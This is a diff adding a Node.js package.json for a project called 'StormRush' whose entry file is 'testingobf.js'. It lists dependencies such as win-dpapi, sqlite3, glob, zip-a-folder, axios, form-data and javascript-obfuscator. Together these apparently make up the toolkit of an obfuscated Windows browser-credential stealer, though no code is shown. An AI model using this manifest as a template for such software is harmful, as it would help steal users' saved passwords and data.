@@ -1,0 +1,22 @@
+{
+  "name": "StormRush",
+  "version": "1.0.0",
+  "description": "",
+  "main": "testingobf.js",
+  "author": "",
+  "license": "ISC",
+  "dependencies": {
+    "axios": "^0.27.2",
+    "buffer-replace": "^1.0.0",
+    "child_process": "^1.0.2",
+    "crypto": "^1.0.1",
+    "form-data": "^4.0.0",
+    "fs": "^0.0.1-security",
+    "glob": "^7.2.0",
+    "javascript-obfuscator": "^4.0.0",
+    "node-gyp": "^9.3.0",
+    "sqlite3": "^5.1.2",
+    "win-dpapi": "^1.1.0",
+    "zip-a-folder": "^1.1.5"
+  }
+}
